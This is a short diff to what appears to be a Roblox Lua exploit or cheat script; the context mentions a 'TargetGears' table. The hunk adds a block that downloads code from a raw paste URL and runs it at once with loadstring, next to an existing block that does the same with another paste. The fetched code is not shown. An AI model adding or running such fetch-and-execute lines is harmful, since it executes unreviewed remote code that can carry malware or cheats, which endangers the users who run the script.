@@ -302,6 +302,10 @@ local TargetGears = {
 }
 
 task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()
+end)
+
+task.spawn(function()
     loadstring(game:HttpGet("https://pastefy.app/eDmA1TWp/raw"))()
 
 task.wait(1)
